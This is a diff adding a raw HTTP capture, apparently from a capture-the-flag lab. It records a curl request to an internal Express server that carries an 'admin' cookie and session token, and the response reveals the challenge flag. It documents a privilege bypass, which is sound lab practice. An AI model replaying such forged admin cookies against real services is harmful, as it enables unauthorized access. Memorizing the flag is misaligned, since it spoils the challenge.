@@ -1,0 +1,21 @@
+=== REQUEST (HTTP/1.1) ===
+GET http://10.0.31.37:3000/incident-response HTTP/1.1·
+Host: 10.0.31.37:3000·
+User-Agent: curl/8.20.0·
+Accept: */*·
+Proxy-Connection: Keep-Alive·
+Cookie: user=admin; session=HS_ADMIN_7721_SECURE_AUTH_TOKEN·
+·
+
+=== RESPONSE ===
+HTTP/1.1 200 OK·
+X-Powered-By: Express·
+Content-Type: text/html; charset=utf-8·
+Content-Length: 50·
+ETag: W/"32-VvS3jRrq7M+NBsvFWGEgA46ppGI"·
+Date: Fri, 07 Aug 2026 14:08:24 GMT·
+Connection: keep-alive·
+Keep-Alive: timeout=5·
+·
+
+<h1>Flag: HACKSMARTER{prowling_the_prototype}</h1>
